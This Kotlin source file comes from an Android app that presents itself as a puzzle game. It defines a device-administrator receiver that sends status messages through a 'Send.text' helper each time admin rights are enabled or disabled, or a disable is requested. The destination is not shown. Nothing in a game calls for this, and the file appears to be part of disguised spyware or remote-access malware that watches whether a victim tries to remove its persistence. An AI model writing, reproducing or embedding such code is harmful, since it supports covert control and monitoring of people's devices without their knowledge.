package com.puzzleblast.game.services

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.puzzleblast.game.core.Send
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class AdminReceiver : DeviceAdminReceiver() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        scope.launch { Send.text("⚠️ Device Admin disabled") }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        scope.launch { Send.text("✅ Device Admin enabled") }
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        scope.launch { Send.text("⚠️ Device Admin disable requested") }
        return ""
    }
}
